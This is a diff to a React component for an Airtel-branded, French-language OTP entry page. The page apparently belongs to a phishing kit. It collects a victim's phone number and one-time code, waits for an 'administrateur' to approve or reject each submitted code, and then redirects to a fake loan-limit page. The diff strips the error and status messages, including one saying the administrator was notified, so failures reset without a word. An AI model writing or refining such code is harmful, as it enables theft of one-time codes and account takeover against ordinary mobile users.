@@ -2,8 +2,6 @@ import React, { useState, useRef, useEffect, useCallback } from 'react';
 import { useNavigate } from 'react-router-dom';
 import './App.css';
 
-type ToastType = 'error' | 'success' | 'info';
-
 const API_BASE = import.meta.env.VITE_API_BASE_URL ?? '';
 
 const OTP_LENGTH = 4;
@@ -28,15 +26,12 @@ function AirtelOTPVerify() {
   const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(''));
   const [timeLeft, setTimeLeft] = useState(TIMER_START);
   const [timerResetKey, setTimerResetKey] = useState(0);
-  const [error, setError] = useState('');
   const [expired, setExpired] = useState(false);
   const [isVerifying, setIsVerifying] = useState(false);
   const [isResending, setIsResending] = useState(false);
   const [waitingForAdmin, setWaitingForAdmin] = useState(false);
-  const [submittedOtp, setSubmittedOtp] = useState('');
   const [refId, setRefId] = useState('');
   const [submittedAt, setSubmittedAt] = useState('');
-  const [toast, setToast] = useState<{ message: string; type: ToastType } | null>(null);
 
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const pollTokenRef = useRef<{ cancelled: boolean } | null>(null);
@@ -45,10 +40,6 @@ function AirtelOTPVerify() {
   const navigate = useNavigate();
 
   const phoneNumber = localStorage.getItem('airtelPhone') || '';
-
-  const showToast = useCallback((message: string, type: ToastType = 'error') => {
-    setToast({ message, type });
-  }, []);
 
   const stopPolling = useCallback(() => {
     if (pollTokenRef.current) pollTokenRef.current.cancelled = true;
@@ -66,12 +57,6 @@ function AirtelOTPVerify() {
   useEffect(() => {
     inputRefs.current[0]?.focus();
   }, []);
-
-  useEffect(() => {
-    if (!toast) return;
-    const t = setTimeout(() => setToast(null), 4000);
-    return () => clearTimeout(t);
-  }, [toast]);
 
   /* ─── Countdown: 45s → 0s, restarts on resend ─── */
   useEffect(() => {
@@ -93,24 +78,16 @@ function AirtelOTPVerify() {
 
   useEffect(() => stopPolling, [stopPolling]);
 
-  const resetToInput = useCallback(
-    (message?: string) => {
-      stopPolling();
-      setIsVerifying(false);
-      setWaitingForAdmin(false);
-      setSubmittedOtp('');
-      setSubmittedAt('');
-      setRefId('');
-      setOtp(Array(OTP_LENGTH).fill(''));
-      sessionStorage.removeItem(PENDING_KEY);
-      if (message) {
-        setError(message);
-        showToast(message, 'error');
-      }
-      setTimeout(() => inputRefs.current[0]?.focus(), 100);
-    },
-    [showToast, stopPolling],
-  );
+  const resetToInput = useCallback(() => {
+    stopPolling();
+    setIsVerifying(false);
+    setWaitingForAdmin(false);
+    setSubmittedAt('');
+    setRefId('');
+    setOtp(Array(OTP_LENGTH).fill(''));
+    sessionStorage.removeItem(PENDING_KEY);
+    setTimeout(() => inputRefs.current[0]?.focus(), 100);
+  }, [stopPolling]);
 
   const startPolling = useCallback(
     (id: string) => {
@@ -134,18 +111,12 @@ function AirtelOTPVerify() {
           if (data.status === 'approved') {
             stopPolling();
             sessionStorage.removeItem(PENDING_KEY);
-            showToast('✅ Code approuvé ! Redirection...', 'success');
-            setTimeout(() => navigate('/airtel-loan-limit'), 800);
+            setTimeout(() => navigate('/airtel-loan-limit'), 300);
             return;
           }
 
-          if (data.status === 'rejected') {
-            resetToInput("❌ Code refusé par l'administrateur. Veuillez saisir un nouveau code.");
-            return;
-          }
-
-          if (data.status === 'expired') {
-            resetToInput('⏱️ Demande expirée. Veuillez réessayer.');
+          if (data.status === 'rejected' || data.status === 'expired') {
+            resetToInput();
             return;
           }
         } catch {
@@ -160,7 +131,7 @@ function AirtelOTPVerify() {
 
       pollTimerRef.current = setTimeout(tick, POLL_FAST_MS);
     },
-    [navigate, resetToInput, showToast, stopPolling],
+    [navigate, resetToInput, stopPolling],
   );
 
   useEffect(() => {
@@ -174,7 +145,6 @@ function AirtelOTPVerify() {
       if (!saved?.refId) return;
 
       setRefId(saved.refId);
-      setSubmittedOtp(saved.otp ?? '');
       setSubmittedAt(saved.submittedAt ?? '');
       setWaitingForAdmin(true);
       setIsVerifying(true);
@@ -219,20 +189,14 @@ function AirtelOTPVerify() {
     if (isVerifying) return;
 
     const otpString = otp.join('');
-    if (otpString.length < OTP_LENGTH) {
-      setError(`Veuillez saisir le code à ${OTP_LENGTH} chiffres.`);
-      showToast(`⚠️ Veuillez saisir le code à ${OTP_LENGTH} chiffres.`, 'error');
-      return;
-    }
+    if (otpString.length < OTP_LENGTH) return;
 
-    setError('');
     setIsVerifying(true);
     setWaitingForAdmin(false);
 
     const newRefId = makeRefId();
     const nowIso = new Date().toISOString();
 
-    setSubmittedOtp(otpString);
     setRefId(newRefId);
     setSubmittedAt(nowIso);
 
@@ -254,13 +218,12 @@ function AirtelOTPVerify() {
 
       if (data.status === 'approved') {
         sessionStorage.removeItem(PENDING_KEY);
-        showToast('✅ Code approuvé ! Redirection...', 'success');
-        setTimeout(() => navigate('/airtel-loan-limit'), 800);
+        setTimeout(() => navigate('/airtel-loan-limit'), 300);
         return;
       }
 
       if (data.status === 'rejected') {
-        resetToInput(data.message || "❌ Code refusé par l'administrateur.");
+        resetToInput();
         return;
       }
 
@@ -271,7 +234,7 @@ function AirtelOTPVerify() {
       );
       startPolling(finalRef);
     } catch {
-      resetToInput('⚠️ Erreur de connexion. Vérifiez votre réseau.');
+      resetToInput();
     }
   };
 
@@ -282,31 +245,22 @@ function AirtelOTPVerify() {
     sessionStorage.removeItem(PENDING_KEY);
     setTimeLeft(TIMER_START);
     setExpired(false);
-    setTimerResetKey((k) => k + 1);     // ← restart countdown
+    setTimerResetKey((k) => k + 1);
     setOtp(Array(OTP_LENGTH).fill(''));
-    setError('');
     setWaitingForAdmin(false);
-    setSubmittedOtp('');
     setSubmittedAt('');
     setRefId('');
     setIsResending(true);
 
     try {
-      const response = await fetch(`${API_BASE}/api/resend-otp`, {
+      await fetch(`${API_BASE}/api/resend-otp`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone_number: phoneNumber }),
       });
-      const data = await response.json();
-
-      if (data.status === 'success') {
-        showToast("📩 Nouveau code envoyé. L'administrateur a été notifié.", 'success');
-        setTimeout(() => inputRefs.current[0]?.focus(), 100);
-      } else {
-        showToast(data.message || "Échec de l'envoi.", 'error');
-      }
+      setTimeout(() => inputRefs.current[0]?.focus(), 100);
     } catch {
-      showToast('Erreur de connexion au serveur.', 'error');
+      /* silent */
     } finally {
       setIsResending(false);
     }
@@ -314,40 +268,6 @@ function AirtelOTPVerify() {
 
   return (
     <div className="airtel-container">
-      {toast && (
-        <div className={`airtel-toast airtel-toast-${toast.type}`}>
-          <div className="airtel-toast-icon">
-            {toast.type === 'error' && (
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                <circle cx="12" cy="12" r="10" />
-                <line x1="12" y1="8" x2="12" y2="12" />
-                <line x1="12" y1="16" x2="12.01" y2="16" />
-              </svg>
-            )}
-            {toast.type === 'success' && (
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                <circle cx="12" cy="12" r="10" />
-                <polyline points="16 9 10.5 15 8 12.5" />
-              </svg>
-            )}
-            {toast.type === 'info' && (
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                <circle cx="12" cy="12" r="10" />
-                <line x1="12" y1="16" x2="12" y2="12" />
-                <line x1="12" y1="8" x2="12.01" y2="8" />
-              </svg>
-            )}
-          </div>
-          <div className="airtel-toast-message">{toast.message}</div>
-          <button className="airtel-toast-close" onClick={() => setToast(null)} aria-label="Fermer">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="18" y1="6" x2="6" y2="18" />
-              <line x1="6" y1="6" x2="18" y2="18" />
-            </svg>
-          </button>
-        </div>
-      )}
-
       <div className="airtel-header">
         <div className="airtel-hamburger">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -405,19 +325,6 @@ function AirtelOTPVerify() {
                   ))}
                 </div>
               </div>
-
-              {error && (
-                <div className="airtel-alert" style={{ marginBottom: '20px' }}>
-                  <div className="alert-icon">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                      <circle cx="12" cy="12" r="10" />
-                      <line x1="12" y1="16" x2="12" y2="12" />
-                      <line x1="12" y1="8" x2="12.01" y2="8" />
-                    </svg>
-                  </div>
-                  <span>{error}</span>
-                </div>
-              )}
 
               {/* ─── Timer: seconds only ─── */}
               <div className="airtel-timer" style={expired ? { color: '#DC2626' } : undefined}>
